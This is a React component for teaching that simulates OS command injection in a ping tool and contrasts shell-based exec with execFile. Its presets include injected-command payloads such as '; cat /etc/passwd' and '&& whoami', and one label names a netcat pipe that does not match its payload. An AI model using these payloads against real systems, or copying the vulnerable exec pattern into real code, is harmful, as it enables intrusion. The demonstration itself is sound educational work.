import React, { useState } from 'react';
import { Terminal, ShieldCheck, ShieldAlert, Cpu, AlertTriangle } from 'lucide-react';

interface Props {
  currentStep: number;
}

export const CommandInjectionVisualizer: React.FC<Props> = ({ currentStep: _currentStep }) => {
  const [selectedPreset, setSelectedPreset] = useState<string>('passwd');
  const [executionMode, setExecutionMode] = useState<'vulnerable' | 'hardened'>('hardened');

  const presets: Record<string, { label: string; payload: string; intent: string }> = {
    normal: {
      label: 'Normal IP Address',
      payload: '8.8.8.8',
      intent: 'Standard diagnostic ping to Google DNS',
    },
    passwd: {
      label: 'Semicolon Chaining (; cat /etc/passwd)',
      payload: '8.8.8.8; cat /etc/passwd',
      intent: 'Execute second arbitrary command to leak user accounts',
    },
    whoami: {
      label: 'Ampersand Chaining (&& whoami)',
      payload: '8.8.8.8 && whoami',
      intent: 'Discover active web server process privileges',
    },
    revshell: {
      label: 'Pipe Exfiltration (| nc 10.0.0.5 4444)',
      payload: '8.8.8.8 | id',
      intent: 'Execute arbitrary system ID command',
    },
  };

  const currentPayload = presets[selectedPreset];
  const isMalicious = selectedPreset !== 'normal';
  const isExploitSuccessful = isMalicious && executionMode === 'vulnerable';

  return (
    <div className="w-full bg-parchment-50 dark:bg-parchment-900 border border-parchment-200 dark:border-parchment-800 rounded-2xl p-6 shadow-sm overflow-hidden">
      {/* Header and Controls */}
      <div className="flex flex-wrap items-center justify-between gap-4 pb-5 border-b border-parchment-200 dark:border-parchment-800">
        <div>
          <span className="text-xs font-mono uppercase tracking-wider text-parchment-400 dark:text-parchment-400">
            Operating System & Process Execution Security
          </span>
          <h3 className="text-xl font-serif font-semibold text-ink-light dark:text-ink-dark flex items-center gap-2">
            OS Command Injection vs. Parameterized ExecFile
          </h3>
        </div>

        {/* Execution Mode Knob */}
        <div className="flex flex-wrap items-center gap-2">
          <button
            onClick={() =>
              setExecutionMode(executionMode === 'hardened' ? 'vulnerable' : 'hardened')
            }
            className={`px-3 py-1.5 text-xs font-mono font-medium rounded-lg border transition-all flex items-center gap-1.5 ${
              executionMode === 'hardened'
                ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-700 dark:text-emerald-400 font-bold'
                : 'bg-red-500/10 border-red-500/30 text-red-700 dark:text-red-400 font-bold'
            }`}
          >
            {executionMode === 'hardened' ? (
              <ShieldCheck className="w-3.5 h-3.5" />
            ) : (
              <ShieldAlert className="w-3.5 h-3.5" />
            )}
            Execution API:{' '}
            {executionMode === 'hardened'
              ? 'execFile(path, argv[]) [SECURE]'
              : 'exec("sh -c " + cmd) [VULNERABLE]'}
          </button>
        </div>
      </div>

      {/* Preset Payload Selector */}
      <div className="my-5 p-4 rounded-xl bg-parchment-100 dark:bg-parchment-950 border border-parchment-200 dark:border-parchment-800 text-xs font-mono">
        <label className="text-ink-muted dark:text-ink-darkMuted block mb-2 font-bold uppercase text-[11px]">
          Simulate User Input in Network Diagnostic Tool:
        </label>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-2">
          {Object.entries(presets).map(([key, item]) => (
            <button
              key={key}
              onClick={() => setSelectedPreset(key)}
              className={`p-2.5 rounded-lg border text-left transition-all ${
                selectedPreset === key
                  ? 'bg-white dark:bg-parchment-900 border-blue-500/60 shadow-xs text-blue-600 dark:text-blue-400 font-bold'
                  : 'bg-white/60 dark:bg-parchment-950/60 border-parchment-200 dark:border-parchment-800 text-ink-muted'
              }`}
            >
              <div className="text-[11px] truncate">{item.label}</div>
              <div className="text-[9px] text-parchment-400 truncate mt-0.5">{item.payload}</div>
            </button>
          ))}
        </div>
      </div>

      {/* Execution Architecture Matrix */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 my-6">
        {/* Box 1: Backend System Call Construction */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800">
              <span className="text-xs font-mono font-bold text-ink-light dark:text-ink-dark flex items-center gap-1.5">
                <Cpu className="w-4 h-4 text-purple-500" /> OS System Call Dispatch
              </span>
              <span className="text-[10px] font-mono text-purple-600 dark:text-purple-400">
                Node.js Kernel Hook
              </span>
            </div>

            <pre
              className={`p-3 rounded-lg border text-[11px] font-mono overflow-x-auto leading-relaxed ${
                executionMode === 'hardened'
                  ? 'bg-emerald-50/50 dark:bg-emerald-950/30 border-emerald-200 dark:border-emerald-900/40 text-emerald-800 dark:text-emerald-300'
                  : 'bg-red-50/50 dark:bg-red-950/30 border-red-200 dark:border-red-900/40 text-red-800 dark:text-red-300'
              }`}
            >
              {executionMode === 'hardened'
                ? `// SECURE: Arguments passed strictly as data array
const { execFile } = require('child_process');

execFile('/bin/ping', [
  '-c',
  '1',
  '${currentPayload.payload}' // Evaluated as single literal argument!
]);`
                : `// VULNERABLE: Shell interpolates string command
const { exec } = require('child_process');

exec(
  "ping -c 1 " + "${currentPayload.payload}" // Shell parses ; and &&
);`}
            </pre>
          </div>
          <span className="text-[10px] font-mono text-ink-muted dark:text-ink-darkMuted mt-3">
            {executionMode === 'hardened'
              ? 'Kernel system call execve(2) treats entire input as argv[3] without shell processing.'
              : '/bin/sh parses the line, treats semicolon as command terminator, and forks a child shell.'}
          </span>
        </div>

        {/* Box 2: Linux Process Tree Execution */}
        <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 flex flex-col justify-between">
          <div>
            <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800">
              <span className="text-xs font-mono font-bold text-ink-light dark:text-ink-dark flex items-center gap-1.5">
                <Terminal className="w-4 h-4 text-blue-500" /> Spawned Process Tree
              </span>
              <span className="text-[10px] font-mono text-ink-muted">PID Hierarchy</span>
            </div>

            <div className="p-3 bg-parchment-950 rounded-lg text-xs font-mono space-y-1.5 overflow-x-auto">
              <div className="text-parchment-400">PID 1001: [node server.js] (Web Worker)</div>
              {executionMode === 'vulnerable' ? (
                <>
                  <div className="text-amber-400 pl-4">
                    └─ PID 1002: [/bin/sh -c "ping -c 1 &#123;input&#125;"]
                  </div>
                  <div className="text-blue-400 pl-8">├─ PID 1003: [ping -c 1 8.8.8.8]</div>
                  {isMalicious && (
                    <div className="text-red-400 pl-8 font-bold flex items-center gap-1">
                      <AlertTriangle className="w-3.5 h-3.5 inline" />
                      └─ PID 1004: [
                      {selectedPreset === 'passwd'
                        ? 'cat /etc/passwd'
                        : selectedPreset === 'whoami'
                          ? 'whoami'
                          : 'id'}
                      ] (INJECTED)
                    </div>
                  )}
                </>
              ) : (
                <div className="text-emerald-400 pl-4 font-semibold">
                  └─ PID 1002: [/bin/ping, -c, 1, "{currentPayload.payload}"] (Single Atomic
                  Process)
                </div>
              )}
            </div>
          </div>
          <span className="text-[10px] font-mono text-ink-muted dark:text-ink-darkMuted mt-3">
            {executionMode === 'hardened'
              ? 'No intermediate shell was ever invoked. Injection impossible.'
              : 'Shell forked secondary rogue child process.'}
          </span>
        </div>
      </div>

      {/* Terminal Wire Output Preview */}
      <div className="p-4 rounded-xl border border-parchment-200 dark:border-parchment-800 bg-white dark:bg-parchment-950 font-mono text-xs">
        <div className="flex items-center justify-between pb-2 mb-2 border-b border-parchment-100 dark:border-parchment-800 text-ink-muted">
          <span className="uppercase font-bold text-[11px]">Command stdout / stderr Stream:</span>
          <span>Status: {isExploitSuccessful ? 'EXPLOITED' : 'SECURE'}</span>
        </div>

        <div className="p-3 bg-parchment-950 rounded-lg text-emerald-400 text-[11px] font-mono overflow-x-auto leading-relaxed mb-4">
          {isExploitSuccessful ? (
            <div>
              <span className="text-parchment-400">PING 8.8.8.8 (8.8.8.8): 56 data bytes</span>
              <br />
              <span className="text-parchment-400">
                64 bytes from 8.8.8.8: icmp_seq=0 ttl=118 time=14.2 ms
              </span>
              <br />
              <span className="text-red-400 font-bold">
                --- COMMAND INJECTION EXPLOIT OUTPUT ---
              </span>
              <br />
              {selectedPreset === 'passwd' ? (
                <span className="text-amber-300">
                  root:x:0:0:root:/root:/bin/bash
                  <br />
                  daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
                  <br />
                  www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
                  <br />
                  deploy:x:1000:1000:Deployer:/home/deploy:/bin/bash
                </span>
              ) : selectedPreset === 'whoami' ? (
                <span className="text-amber-300">
                  uid=33(www-data) gid=33(www-data) groups=33(www-data)
                </span>
              ) : (
                <span className="text-amber-300">uid=0(root) gid=0(root) groups=0(root)</span>
              )}
            </div>
          ) : executionMode === 'hardened' && isMalicious ? (
            <div>
              <span className="text-red-400">
                ping: cannot resolve {currentPayload.payload}: Unknown host
              </span>
              <br />
              <span className="text-emerald-400">
                [EXECUTION SAFE] Input was treated literally as host address. Semicolon was not
                evaluated.
              </span>
            </div>
          ) : (
            <div>
              <span className="text-parchment-400">PING 8.8.8.8 (8.8.8.8): 56 data bytes</span>
              <br />
              <span className="text-parchment-400">
                64 bytes from 8.8.8.8: icmp_seq=0 ttl=118 time=12.8 ms
              </span>
              <br />
              <span className="text-emerald-400">
                1 packets transmitted, 1 packets received, 0.0% packet loss
              </span>
            </div>
          )}
        </div>

        {/* Outcome Alert Banner */}
        {isExploitSuccessful ? (
          <div className="p-3 rounded-lg bg-red-500/10 border border-red-500/40 text-red-700 dark:text-red-400 flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 flex-shrink-0" />
            <div>
              <div className="font-bold text-sm">REMOTE CODE EXECUTION (RCE) ACHIEVED!</div>
              <div className="text-[11px] opacity-90 mt-0.5">
                The shell executed the injected{' '}
                <code className="font-bold">{currentPayload.payload}</code> with full web server
                privileges. An attacker can deploy web shells, dump environment secrets, and pivot
                inside the server host.
              </div>
            </div>
          </div>
        ) : (
          <div className="p-3 rounded-lg bg-emerald-500/10 border border-emerald-500/40 text-emerald-700 dark:text-emerald-400 flex items-center gap-2">
            <ShieldCheck className="w-5 h-5 flex-shrink-0" />
            <div>
              <div className="font-bold text-sm">COMMAND INJECTION COMPLETELY PREVENTED!</div>
              <div className="text-[11px] opacity-90 mt-0.5">
                By using <code className="font-bold">execFile</code> without a shell intermediary,
                the arguments array was passed directly to the operating system kernel via{' '}
                <code className="font-bold">execve(2)</code>. The shell metacharacters were
                evaluated as literal data.
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
};
